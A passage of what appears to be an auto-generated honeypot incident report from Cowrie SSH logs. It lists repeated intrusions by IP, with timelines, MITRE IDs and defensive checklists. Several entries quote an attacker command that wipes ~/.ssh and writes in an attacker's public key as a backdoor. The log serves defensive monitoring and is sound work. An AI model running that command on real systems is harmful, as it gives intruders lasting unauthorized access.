| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:08:07` | `cowrie.session.connect` |
| `2026-09-25 12:08:08` | `cowrie.client.version` |
| `2026-09-25 12:08:08` | `cowrie.client.kex` |
| `2026-09-25 12:08:09` | `cowrie.login.success` |
| `2026-09-25 12:08:10` | `cowrie.session.params` |
| `2026-09-25 12:08:10` | `cowrie.command.input` |
| `2026-09-25 12:08:11` | `cowrie.log.closed` |
| `2026-09-25 12:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e7e3ffbc87

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:08 |
| **Last Seen** | 2026-09-25 12:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:08:11` | `cowrie.session.connect` |
| `2026-09-25 12:08:11` | `cowrie.client.version` |
| `2026-09-25 12:08:11` | `cowrie.client.kex` |
| `2026-09-25 12:08:13` | `cowrie.login.success` |
| `2026-09-25 12:08:14` | `cowrie.session.params` |
| `2026-09-25 12:08:14` | `cowrie.command.input` |
| `2026-09-25 12:08:15` | `cowrie.log.closed` |
| `2026-09-25 12:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7118fa9d043c

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:08 |
| **Last Seen** | 2026-09-25 12:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:08:14` | `cowrie.session.connect` |
| `2026-09-25 12:08:14` | `cowrie.client.version` |
| `2026-09-25 12:08:14` | `cowrie.client.kex` |
| `2026-09-25 12:08:17` | `cowrie.login.success` |
| `2026-09-25 12:08:18` | `cowrie.session.params` |
| `2026-09-25 12:08:18` | `cowrie.command.input` |
| `2026-09-25 12:08:19` | `cowrie.log.closed` |
| `2026-09-25 12:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561675d8b8dc

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:08 |
| **Last Seen** | 2026-09-25 12:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:08:19` | `cowrie.session.connect` |
| `2026-09-25 12:08:19` | `cowrie.client.version` |
| `2026-09-25 12:08:20` | `cowrie.client.kex` |
| `2026-09-25 12:08:21` | `cowrie.login.success` |
| `2026-09-25 12:08:22` | `cowrie.session.params` |
| `2026-09-25 12:08:22` | `cowrie.command.input` |
| `2026-09-25 12:08:22` | `cowrie.log.closed` |
| `2026-09-25 12:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-095be76c800f

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:08 |
| **Last Seen** | 2026-09-25 12:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:08:34` | `cowrie.session.connect` |
| `2026-09-25 12:08:34` | `cowrie.client.version` |
| `2026-09-25 12:08:34` | `cowrie.client.kex` |
| `2026-09-25 12:08:35` | `cowrie.login.success` |
| `2026-09-25 12:08:36` | `cowrie.session.params` |
| `2026-09-25 12:08:36` | `cowrie.command.input` |
| `2026-09-25 12:08:36` | `cowrie.log.closed` |
| `2026-09-25 12:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cc9eb828dac

| Field | Detail |
|---|---|
| **Source IP** | `41.204.63[.]118` |
| **First Seen** | 2026-09-25 12:09 |
| **Last Seen** | 2026-09-25 12:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:09:34` | `cowrie.session.connect` |
| `2026-09-25 12:09:34` | `cowrie.client.version` |
| `2026-09-25 12:09:34` | `cowrie.client.kex` |
| `2026-09-25 12:09:35` | `cowrie.login.success` |
| `2026-09-25 12:09:36` | `cowrie.session.params` |
| `2026-09-25 12:09:36` | `cowrie.command.input` |
| `2026-09-25 12:09:36` | `cowrie.command.failed` |
| `2026-09-25 12:09:36` | `cowrie.log.closed` |
| `2026-09-25 12:09:37` | `cowrie.session.params` |
| `2026-09-25 12:09:37` | `cowrie.command.input` |
| `2026-09-25 12:09:37` | `cowrie.session.file_download` |
| `2026-09-25 12:09:37` | `cowrie.log.closed` |
| `2026-09-25 12:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.204.63[.]118` to AbuseIPDB if not already reported
- [ ] Block `41.204.63[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc7e07770a0e

| Field | Detail |
|---|---|
| **Source IP** | `41.204.63[.]118` |
| **First Seen** | 2026-09-25 12:09 |
| **Last Seen** | 2026-09-25 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:09:37` | `cowrie.session.connect` |
| `2026-09-25 12:09:37` | `cowrie.client.version` |
| `2026-09-25 12:09:38` | `cowrie.client.kex` |
| `2026-09-25 12:09:38` | `cowrie.login.success` |
| `2026-09-25 12:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.204.63[.]118` to AbuseIPDB if not already reported
- [ ] Block `41.204.63[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19de5e8b248

| Field | Detail |
|---|---|
| **Source IP** | `41.204.63[.]118` |
| **First Seen** | 2026-09-25 12:09 |
| **Last Seen** | 2026-09-25 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:09:39` | `cowrie.session.connect` |
| `2026-09-25 12:09:39` | `cowrie.client.version` |
| `2026-09-25 12:09:39` | `cowrie.client.kex` |
| `2026-09-25 12:09:40` | `cowrie.login.success` |
| `2026-09-25 12:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.204.63[.]118` to AbuseIPDB if not already reported
- [ ] Block `41.204.63[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891a01709a18

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-09-25 12:09 |
| **Last Seen** | 2026-09-25 12:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:09:43` | `cowrie.session.connect` |
| `2026-09-25 12:09:43` | `cowrie.client.version` |
| `2026-09-25 12:09:44` | `cowrie.client.kex` |
| `2026-09-25 12:09:44` | `cowrie.login.success` |
| `2026-09-25 12:09:45` | `cowrie.session.params` |
| `2026-09-25 12:09:45` | `cowrie.command.input` |
| `2026-09-25 12:09:45` | `cowrie.command.failed` |
| `2026-09-25 12:09:45` | `cowrie.log.closed` |
| `2026-09-25 12:09:46` | `cowrie.session.params` |
| `2026-09-25 12:09:46` | `cowrie.command.input` |
| `2026-09-25 12:09:46` | `cowrie.session.file_download` |
| `2026-09-25 12:09:46` | `cowrie.log.closed` |
| `2026-09-25 12:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f50bec890a1c

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-09-25 12:09 |
| **Last Seen** | 2026-09-25 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:09:46` | `cowrie.session.connect` |
| `2026-09-25 12:09:46` | `cowrie.client.version` |
| `2026-09-25 12:09:46` | `cowrie.client.kex` |
| `2026-09-25 12:09:47` | `cowrie.login.success` |
| `2026-09-25 12:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f29266f0965

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-09-25 12:09 |
| **Last Seen** | 2026-09-25 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:09:47` | `cowrie.session.connect` |
| `2026-09-25 12:09:47` | `cowrie.client.version` |
| `2026-09-25 12:09:47` | `cowrie.client.kex` |
| `2026-09-25 12:09:48` | `cowrie.login.success` |
| `2026-09-25 12:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-239bb21d958d

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:12 |
| **Last Seen** | 2026-09-25 12:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:12:32` | `cowrie.session.connect` |
| `2026-09-25 12:12:32` | `cowrie.client.version` |
| `2026-09-25 12:12:32` | `cowrie.client.kex` |
| `2026-09-25 12:12:33` | `cowrie.login.success` |
| `2026-09-25 12:12:34` | `cowrie.session.params` |
| `2026-09-25 12:12:34` | `cowrie.command.input` |
| `2026-09-25 12:12:35` | `cowrie.log.closed` |
| `2026-09-25 12:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cff517c582da

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:12 |
| **Last Seen** | 2026-09-25 12:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:12:38` | `cowrie.session.connect` |
| `2026-09-25 12:12:40` | `cowrie.client.version` |
| `2026-09-25 12:12:40` | `cowrie.client.kex` |
| `2026-09-25 12:12:41` | `cowrie.login.success` |
| `2026-09-25 12:12:43` | `cowrie.session.params` |
| `2026-09-25 12:12:43` | `cowrie.command.input` |
| `2026-09-25 12:12:43` | `cowrie.log.closed` |
| `2026-09-25 12:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2abdf134220

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:12 |
| **Last Seen** | 2026-09-25 12:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:12:46` | `cowrie.session.connect` |
| `2026-09-25 12:12:46` | `cowrie.client.version` |
| `2026-09-25 12:12:46` | `cowrie.client.kex` |
| `2026-09-25 12:12:47` | `cowrie.login.success` |
| `2026-09-25 12:12:48` | `cowrie.session.params` |
| `2026-09-25 12:12:48` | `cowrie.command.input` |
| `2026-09-25 12:12:48` | `cowrie.log.closed` |
| `2026-09-25 12:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd0979eef866

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:12 |
| **Last Seen** | 2026-09-25 12:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:12:52` | `cowrie.session.connect` |
| `2026-09-25 12:12:52` | `cowrie.client.version` |
| `2026-09-25 12:12:52` | `cowrie.client.kex` |
| `2026-09-25 12:12:53` | `cowrie.login.success` |
| `2026-09-25 12:12:54` | `cowrie.session.params` |
| `2026-09-25 12:12:54` | `cowrie.command.input` |
| `2026-09-25 12:12:55` | `cowrie.log.closed` |
| `2026-09-25 12:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17f7f93151be

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:12 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:12:55` | `cowrie.session.connect` |
| `2026-09-25 12:12:55` | `cowrie.client.version` |
| `2026-09-25 12:12:55` | `cowrie.client.kex` |
| `2026-09-25 12:12:58` | `cowrie.login.success` |
| `2026-09-25 12:12:59` | `cowrie.session.params` |
| `2026-09-25 12:12:59` | `cowrie.command.input` |
| `2026-09-25 12:13:00` | `cowrie.log.closed` |
| `2026-09-25 12:13:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73decacbb4a9

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:00` | `cowrie.session.connect` |
| `2026-09-25 12:13:00` | `cowrie.client.version` |
| `2026-09-25 12:13:00` | `cowrie.client.kex` |
| `2026-09-25 12:13:02` | `cowrie.login.success` |
| `2026-09-25 12:13:05` | `cowrie.session.params` |
| `2026-09-25 12:13:05` | `cowrie.command.input` |
| `2026-09-25 12:13:05` | `cowrie.log.closed` |
| `2026-09-25 12:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14f67cfc6e05

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:06` | `cowrie.session.connect` |
| `2026-09-25 12:13:06` | `cowrie.client.version` |
| `2026-09-25 12:13:07` | `cowrie.client.kex` |
| `2026-09-25 12:13:07` | `cowrie.login.success` |
| `2026-09-25 12:13:08` | `cowrie.session.params` |
| `2026-09-25 12:13:08` | `cowrie.command.input` |
| `2026-09-25 12:13:09` | `cowrie.log.closed` |
| `2026-09-25 12:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53110ba4c73d

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:09` | `cowrie.session.connect` |
| `2026-09-25 12:13:09` | `cowrie.client.version` |
| `2026-09-25 12:13:09` | `cowrie.client.kex` |
| `2026-09-25 12:13:11` | `cowrie.login.success` |
| `2026-09-25 12:13:12` | `cowrie.session.params` |
| `2026-09-25 12:13:12` | `cowrie.command.input` |
| `2026-09-25 12:13:12` | `cowrie.log.closed` |
| `2026-09-25 12:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c244fd1dfed

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:16` | `cowrie.session.connect` |
| `2026-09-25 12:13:16` | `cowrie.client.version` |
| `2026-09-25 12:13:16` | `cowrie.client.kex` |
| `2026-09-25 12:13:17` | `cowrie.login.success` |
| `2026-09-25 12:13:18` | `cowrie.session.params` |
| `2026-09-25 12:13:18` | `cowrie.command.input` |
| `2026-09-25 12:13:19` | `cowrie.log.closed` |
| `2026-09-25 12:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc41aa756e9

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:19` | `cowrie.session.connect` |
| `2026-09-25 12:13:19` | `cowrie.client.version` |
| `2026-09-25 12:13:19` | `cowrie.client.kex` |
| `2026-09-25 12:13:20` | `cowrie.login.success` |
| `2026-09-25 12:13:22` | `cowrie.session.params` |
| `2026-09-25 12:13:22` | `cowrie.command.input` |
| `2026-09-25 12:13:23` | `cowrie.log.closed` |
| `2026-09-25 12:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbff37bc9e93

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:23` | `cowrie.session.connect` |
| `2026-09-25 12:13:23` | `cowrie.client.version` |
| `2026-09-25 12:13:23` | `cowrie.client.kex` |
| `2026-09-25 12:13:26` | `cowrie.login.success` |
| `2026-09-25 12:13:28` | `cowrie.session.params` |
| `2026-09-25 12:13:28` | `cowrie.command.input` |
| `2026-09-25 12:13:28` | `cowrie.log.closed` |
| `2026-09-25 12:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5fe50a82f85

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:31` | `cowrie.session.connect` |
| `2026-09-25 12:13:31` | `cowrie.client.version` |
| `2026-09-25 12:13:31` | `cowrie.client.kex` |
| `2026-09-25 12:13:32` | `cowrie.login.success` |
| `2026-09-25 12:13:35` | `cowrie.session.params` |
| `2026-09-25 12:13:35` | `cowrie.command.input` |
| `2026-09-25 12:13:35` | `cowrie.log.closed` |
| `2026-09-25 12:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b16d9352779

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:36` | `cowrie.session.connect` |
| `2026-09-25 12:13:36` | `cowrie.client.version` |
| `2026-09-25 12:13:36` | `cowrie.client.kex` |
| `2026-09-25 12:13:38` | `cowrie.login.success` |
| `2026-09-25 12:13:39` | `cowrie.session.params` |
| `2026-09-25 12:13:39` | `cowrie.command.input` |
| `2026-09-25 12:13:40` | `cowrie.log.closed` |
| `2026-09-25 12:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-597ec3c2b033

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:40` | `cowrie.session.connect` |
| `2026-09-25 12:13:40` | `cowrie.client.version` |
| `2026-09-25 12:13:41` | `cowrie.client.kex` |
| `2026-09-25 12:13:42` | `cowrie.login.success` |
| `2026-09-25 12:13:43` | `cowrie.session.params` |
| `2026-09-25 12:13:43` | `cowrie.command.input` |
| `2026-09-25 12:13:44` | `cowrie.log.closed` |
